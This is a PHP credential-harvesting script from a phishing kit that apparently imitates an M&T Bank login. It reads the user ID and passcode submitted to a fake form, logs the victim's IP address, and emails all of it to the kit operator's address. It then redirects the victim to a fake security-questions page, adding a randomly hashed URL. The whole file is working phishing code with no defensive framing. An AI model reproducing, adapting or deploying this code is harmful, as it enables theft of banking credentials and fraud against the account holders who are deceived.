<?php
session_start();
$_SESSION['userId'] = $_POST['userId'];
$_SESSION['Passcode'] = $_POST['Passcode'];


include 'Email.php';

$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ MTB ]---------------------\n";
$message .= "USER     : ".$_SESSION['userId']."\n";
$message .= "PASS     : ".$_SESSION['Passcode']."\n";
$message .= "--------------[ ZEBBY ]-------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ MTB ]---------------------\n";
$subject = "Email|MTB  $ip";
$headers = "From: BLESSING <email@info.com>";
mail($SEND,$subject,$message,$headers);



$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

$Logon="SecurityQuestions.html?$host-$host-$host$host$host$host$host$host$host$host$host";

header("location: $Logon");

?>